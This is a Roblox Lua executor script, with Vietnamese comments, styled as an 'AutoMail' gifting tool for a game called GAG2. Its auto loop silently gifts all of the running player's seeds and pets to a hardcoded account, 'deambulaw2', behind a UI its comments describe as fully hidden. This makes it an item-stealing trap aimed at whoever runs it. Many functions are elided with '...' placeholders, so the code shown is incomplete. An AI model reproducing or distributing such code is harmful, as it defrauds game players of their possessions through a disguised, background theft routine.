-- =============================================
-- AutoMail GAG2 - Auto Gift All to deambulaw2
-- By Mtr Chill (v2 - Auto Mode)
-- =============================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local username = LocalPlayer.Name

local configPath = username .. "-sendmailgag2.json"
local TARGET = "deambulaw2"
local TARGET_UID = nil

-- ===================== DEFAULT CONFIG =====================
local defaultConfig = {
    Recipient = TARGET,
    RecipientUserId = 0,
    Note = "Mtr Chill",
    Seeds = { ... }, -- giữ nguyên toàn bộ Seeds (giống script cũ)
    Pets = { ... }   -- giữ nguyên toàn bộ Pets
}

-- ===================== FILE IO =====================
local function loadConfig() ... end
local function saveConfig(cfg) ... end

local savedCfg = loadConfig()
local cfg = savedCfg or {}
for section, items in pairs(defaultConfig) do
    if type(items) == "table" and section \~= "Recipient" and section \~= "RecipientUserId" and section \~= "Note" then
        cfg[section] = cfg[section] or {}
        for name, def in pairs(items) do
            cfg[section][name] = cfg[section][name] or { enabled = false, amount = def.amount }
        end
    end
end
cfg.Recipient = cfg.Recipient or defaultConfig.Recipient
cfg.RecipientUserId = cfg.RecipientUserId or defaultConfig.RecipientUserId
cfg.Note = cfg.Note or defaultConfig.Note

-- ===================== UI BUILD (ẩn hoàn toàn) =====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoMailGAG2_UI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = (gethui and gethui()) or game:GetService("CoreGui")

local C = { ... } -- giữ nguyên toàn bộ colors (bg, panel, accent...)

-- (Toàn bộ phần mkFrame, mkLabel, mkBtn, Main, Drag, Header, MTBtn, Recipient, Note, TabBar, SearchBar, listFrame, logFrame, clearLogBtn, LOG_COLORS, addLog, statusBar, startBtn, onceBtn, claimBtn... giữ nguyên 100% như script cũ)

-- ===================== ITEM ROWS & LOGIC (ẩn) =====================
local function setStatus(msg, color) ... end

local itemRows = {}
local function buildRows(tabName) ... end

local activeTab = "Seeds"
local function switchTab(name) ... end

for _, name in ipairs({"Seeds","Pets","Log"}) do
    -- (tab switching ẩn)
end
switchTab("Seeds")

-- ===================== SEND LOGIC =====================
-- (giữ nguyên toàn bộ Networking, SEED_KEY_MAP, getInvSafe, collectPayload, sendOneRound... giống script cũ)

local running = true
local totalSent = 0
local stopRequested = false

-- ===================== AUTO GIFT LOOP =====================
local function autoSendRound()
    local uid = TARGET_UID
    if not uid then
        local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(TARGET) end)
        if ok and id > 0 then
            uid = id
            TARGET_UID = uid
        else
            warn("[AutoMail] Không tìm thấy user: " .. TARGET)
            return
        end
    end

    local payload = collectPayload()
    if #payload == 0 then
        addLog("Không có item nào để gift", "warn")
        return
    end

    for i, item in ipairs(payload) do
        setStatus(string.format("📨 Auto Gift [%d/%d] %s x%d", i, #payload, item.DisplayName, item.Count), C.accent)

        local ok, msg = sendBatch(uid, {
            { Category = item.Category, ItemKey = item.ItemKey, Count = item.Count }
        }, cfg.Note)

        if ok then
            local actual = tonumber(string.match(tostring(msg or ""), "%d+")) or item.Count
            totalSent += actual
            addLog(string.format("Auto Gift %s x%d — OK", item.DisplayName, actual), "ok")
        else
            addLog(string.format("Auto Gift %s — FAIL", item.DisplayName), "fail")
        end

        if i < #payload then task.wait(1.8) end
    end
end

-- ===================== AUTO LOOP (chạy ngầm) =====================
task.spawn(function()
    while running do
        autoSendRound()
        task.wait(8) -- delay giữa các vòng (bạn có thể chỉnh)
    end
end)

-- ===================== CLAIM NGẦM =====================
local claimRunning = true
task.spawn(function()
    while claimRunning do
        -- (giữ nguyên hàm claim code như cũ, chỉ chạy ngầm)
        task.wait(3)
    end
end)

print("[AutoMailUI] AUTO GIFT MODE ACTIVE - Gift tất cả item cho " .. TARGET)
addLog("=== AUTO MODE BẬT - Gift ALL cho " .. TARGET .. " ===", "info")